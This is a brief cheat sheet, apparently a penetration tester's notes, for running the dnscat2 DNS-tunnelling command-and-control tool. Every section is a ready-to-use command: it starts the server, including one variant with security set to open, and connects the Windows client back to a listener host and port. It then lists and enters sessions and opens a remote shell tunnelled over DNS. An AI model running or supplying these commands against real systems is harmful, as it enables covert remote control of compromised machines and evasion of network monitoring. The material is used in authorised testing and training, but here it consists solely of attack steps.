### source
https://github.com/iagox86/dnscat2  

### start server without specific domain
```
ruby dnscat2.rb
```

### start exe client
```
.\dnscat2 --dns server=<lhost>,port=<lport> --secret=<secret>
```

### start server for interaction with dnscat2-powershell
```
ruby dnscat2.rb --security=open --no-cache --dns domain=<domain>
```


### list sessions
```
dns> session
```

### interact with session
```
dns> session -i <id>
```

### start shell
```
shell
CTRL + z
dns> session -i <newId>
```

